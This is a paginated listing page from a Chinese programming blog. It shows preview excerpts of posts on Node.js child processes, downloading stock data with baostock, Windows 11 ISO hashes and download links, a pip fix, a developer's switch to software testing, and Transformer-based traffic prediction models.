			<a href="/posts/8fcbcbe7ad392c450835463628c77364/" rel="bookmark">
			nodejs 项目实现多进程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		点击下方“青年码农”关注
回复“源码”可获取软件，源码等资料
在 Node.js 中，可以通过创建多个进程来充分利用多核 CPU 的优势，从而提高 Node.js 应用程序的性能和稳定性。今天我们分享两种方法来实现多进程：
1. 使用 child_process 模块创建子进程
Node.js 内置的 child_process 模块可以让我们方便地创建子进程。可以使用该模块的 spawn()、exec() 和 fork() 方法来创建子进程。其中，fork() 方法是最常用的方法，因为它可以在子进程中运行 Node.js 模块，并且能够方便地进行进程之间的通信。
1）exec
exec 方法可以在一个新的 shell 中执行一个命令，并缓存子进程的输出和错误信息。它适用于执行一次性的、相对较短的命令，比如一些简单的 shell 脚本。下面是一个例子：
const { exec } = require('child_process'); exec('ls -lh', (error, stdout, stderr) =&gt; { if (error) { console.error(`执行出错: ${error}`); return; } console.log(`标准输出: ${stdout}`); console.error(`标准错误: ${stderr}`); }); 2）spawn
spawn 方法可以启动一个新的进程来执行一个命令，并实时获取子进程的输出流和错误流。它适用于执行长时间运行的命令，比如一些文件处理任务。下面是一个例子：
const { spawn } = require('child_process'); const child = spawn('ls', ['-lh', '/usr']); child.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8fcbcbe7ad392c450835463628c77364/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57798d9d7762b489f985f5283ef97b24/" rel="bookmark">
			【Python】用baostock和akshare下载股票的日线数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import baostock as bs import pandas as pd import time st = time.time() # 登陆系统 lg = bs.login() # 读取所有的股票代码 df = pd.read_csv(r'D:\test\all_stock.csv',encoding = 'gbk') code_list = df['code'].values.tolist() # 获取天数 start_date='2022-01-01' end_date='2023-03-08' start = datetime.datetime.strptime(start_date,'%Y-%m-%d') end = datetime.datetime.strptime(end_date,'%Y-%m-%d') s = (end-start).days # 存储list data_list = [] # 获取沪深A股历史K线数据 for code in code_list: if len(code)!=9: continue rs_result = bs.query_history_k_data_plus(code, fields="date,code,open,high,low,close,preclose,volume,amount,adjustflag,turn,tradestatus,pctChg,isST", start_date='2022-01-01', end_date='2023-03-08', frequency="d", adjustflag="3") # print(rs_result.get_data()) i = 0 while (i&lt;s) &amp;(rs_result.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57798d9d7762b489f985f5283ef97b24/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc214a67784117d09e805b274b7c5fc4/" rel="bookmark">
			Windows11原版镜像
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows 11（企业版）, 版本 22H2（2023年02月发布）64 位简体中文
文件：zh-cn_windows_11_business_editions_version_22h2_updated_feb_2023_x64_dvd_632649a2.iso
大小：5.26GB
MD5：D1EE970B9680397B0B9D304D36286847
SHA1：2484FDA8CDDB095C8ECD2291041B16E4864C7B01
SHA256：E8600723ED83FFE47289C452A5265782D29F6F11003CC20EB5E45AB1156337D7
ED2k下载：
ed2k://|file|zh-cn_windows_11_business_editions_version_22h2_updated_feb_2023_x64_dvd_632649a2.iso|5644044288|8C21F04E76174F373B0E5BF19E42C4AB|/ BT种子下载
magnet:?xt=urn:btih:acf32c35ef8b07fb57f7169cf7f5b2ff75d8a13a&amp;dn=zh-cn_windows_11_business_editions_version_22h2_updated_feb_2023_x64_dvd_632649a2.iso&amp;xl=5644044288 Windows 10（消费者版）, 版本 22H2（2023年2月发布）64位简体中文
文件：zh-cn_windows_11_consumer_editions_version_22h2_updated_feb_2023_x64_dvd_ddc14153.iso
大小：5.35GB
MD5：39DA7C4C2AB614DE2E3EB24520E596EA
SHA1：E40C46A12115FA1E21E1A0B3CD050B9D419D3CB3
SHA256：922398EE85C9EB44C195BE68470B1883791C9FE4E57DBCDEA25C2ECC27A8B236
ed2k：
ed2k://|file|zh-cn_windows_11_consumer_editions_version_22h2_updated_feb_2023_x64_dvd_ddc14153.iso|5745096704|7D392074C6158C19CB4C1F030364615B|/ BT种子：
magnet:?xt=urn:btih:89800269883fe3e03665ae511365a87d96bbf5c1&amp;dn=zh-cn_windows_11_consumer_editions_version_22h2_updated_feb_2023_x64_dvd_ddc14153.iso&amp;xl=5745096704 如果需要win10原版镜像可以找我之前发的镜像
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/00b32bfd779b9731ee08d4adeec7ab54/" rel="bookmark">
			Python与pip不匹配的解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python -m pip install pip
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cd659b4773bafae2b5c091015af7775/" rel="bookmark">
			从java开发转行做测试的心路历程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我转测试了，准确的说现在我是一名测开
其实早该写这篇文章的，一直觉得自己混的不好，不愿意面对这么差劲的自己
从小到大我一直算是同龄人中较优秀的存在，毕业后去到了一家看起来各方面都不错的公司（大公司很适合养老，除了工资不高技术老旧其他都很好），那个时候我还是做java开发，在这个公司呆了两年，在各种加班领导pua的情况下选择了裸辞，因为当时觉得有一个多月的假在这一个多月里休息休息怎么也找到工作了（5.1号离开的公司，6.18办的离职，期间都算休假，一个月18天的假），然而理想很美好现实却很残酷，投了两周的简历面了几家还没有任何回应后压力非常大，上家公司领导的pua加上面试机会很少（当时北京正值疫情），面过的也没有回应，意识到了自己的技术太差了，我渐渐对自己的未来感到很迷茫，当初一起去北京的同学们各自考虑回老家附近的城市发展。
那时候考虑的最多的就是我真的适合这行吗？这行真的能干长久吗？不干程序员我还能干什么？我有什么擅长的？想起大学一直在做的家教，于是想到了做老师，有想法就行动，我投了掌门1对1以及另一家辅导班，掌门1对1因为我没教师资格证直接被pass掉了，另一家辅导班的薪资太低上班时间长没选择，联系了做老师的同学了解情况后果断花两千块报了个线上教资辅导班，结果没学几天还是决定干IT，技术不行就去做测试吧，有代码基础应该有优势，就这样选择了做测试。
决定做测试之后，选择了沉下心来学习一套培训班的测试课程，学到一半的时候我就出来找工作了，考虑到之后准备去杭州定居，上海也有几个不错的同学，就都投的上海的岗位，当时觉得外包门槛低，活多儿累但是能学东西还能拿到不错的工资，就都投的外包（不错，当时天真了）。
九月中旬来的上海，面了三家拿到了两家的offer，一个外派银行、一个外派华为，两个offer一对比果断选择了外派华为，毕竟华为名声在那是吧（还记得当时招我那个hr在我决定接受offer之后还跟我提了一嘴说你这么好的条件你在面面别的，当时一脸问号。没想那么多，就觉得这么久没工作了，不想面了想赶紧有个班上）。进去后跟想象的完全不一样，一周有两三个半天测试吃鸡（和平精英），其他时间都坐在那发呆（外包的办公室不能带手机，进出办公室要接受安检扫描，办公室的网络作了限制，有很多东西都无法访问），这样大概一个多月吧，有一个我们一个组的在另一个项目组的女生由于身体原因要做手术让我过去顶替俩月，刚过去的时候我那个开心，因为这里有业务、有自动化测试。
接着华为这边项目组调整换了PM，那个女生回来之后这个PM已经跟我熟了不想换人，就跟外包公司的PM协商，最后我俩一人轮流一个月，没过几个月再次调整让我俩都在这个项目组，她成了我在公司里最要好的同事。又过两个月外包项目组这边经历了一次离职潮。
然后就是现在的公司了，做云计算的，前景很好，加油～
下面是我特意花了一段时间整理编写了下面的 《软件测试工程师学习路线》 ，也整理了不少 【网盘资源】，需要的朋友可以 文末自行获取网盘链接。希望会给你带来帮助和方向。
1. 自动化测试必备Python编程内容 2. Web UI 自动化测试基础内容 3. Web UI 自动化测试实战内容 4. APP UI 自动化测试基础内容 5. APP UI 自动化测试实战内容 6. API 接口自动化测试基础内容 7. API 接口自动化测试实战内容 8. CI/CD持续集成专项技术 9. 自动化测试框架实战技术 上面就是我整理出来的一份自动化测试工程师技术路径图。希望大家能在这个成长过程中收益良多。全方位提升测试技术，建立一套属于自己的技术体系。帮助大家不断学习和优化技术栈，跟进先进和主流的测试技术，给到大家带来的不仅仅是技术和薪资的提升，更多的是 改变测试人在IT技术领域的地位和心态，拔高测试行业的技术深度。
最后： 下方这份完整的软件测试视频学习教程已经整理上传完成，朋友们如果需要可以自行免费领取 【保证100%免费】
这些资料，对于【软件测试】的朋友来说应该是最全面最完整的备战仓库，这个仓库也陪伴上万个测试工程师们走过最艰难的路程，希望也能帮助到你！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/149d16d99ee5eb8593c62403c102ec2e/" rel="bookmark">
			基于Transformer的交通预测模型部分汇总【附源代码】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		交通预测一直是一个重要的问题，它涉及到交通运输系统的可靠性和效率。随着人工智能的发展，越来越多的研究者开始使用深度学习模型来解决这个问题。其中，基于Transformer的交通预测模型在近年来备受关注，因为它们具有优秀的建模能力和较好的预测准确性。
本文将介绍几个基于Transformer的交通预测模型，欢迎讨论。如有错误，也请指正。 目录 1. STTN（2020）2. Traffic Transformer（T-ITS 2021）3. ASTGNN（TKDE 2021）4. MGT（Neurocomputing 2022）5. ASTTN（2022）6. PDFormer（AAAI 2023）参考 1. STTN（2020） 论文：[2001.02908] Spatial-Temporal Transformer Networks for Traffic Flow Forecasting
代码：GitHub - Lin956/STTNS: Spatial-Temporal Transformer Networks for Traffic Flow Forecasting
作者：Xu M, Dai W, Liu C, et al.
针对问题：
动态空间相关性：空间相关性随时间变化（实时的交通状况和交通流方向） &lt;—— 设计了一种GNN变体，spatial transformer建模时变有向空间相关性；
长期时间相关性：长期时间相关性（短期&lt;30min，长期&gt;=30min）考虑得少，且过去自回归方法存在误差累积问题&lt;—— 设计了 temporal transformer实现长期多步预测。
模型设计：
所提出的STTN（Spatial-Temporal Transformer Network）由堆叠的时空块和预测层组成。每个时空块由一个空间transformer和一个时间transformer组成，共同提取上下文动态依赖的时空特征。时空块可以进一步堆叠，形成深层时空特征的深层模型。然后，预测层利用两个1 × 1卷积层聚合这些时空特征进行交通预测。
在空间transformer中包含固定图卷积层（Fixed Graph，使用图卷积捕获平稳的空间依赖关系）、动态图卷积层（Dynamical Graph，使用多头自注意力捕获动态双向的空间依赖关系，节点特征用在前馈神经网络中）以及门控机制（融合上述固定与动态的空间特征）。
2. Traffic Transformer（T-ITS 2021） 论文：[2104.05163] Learning dynamic and hierarchical traffic spatiotemporal features with Transformer
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/149d16d99ee5eb8593c62403c102ec2e/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/167/">«</a>
	<span class="pagination__item pagination__item--current">168/516</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/169/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程鬼谷子的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>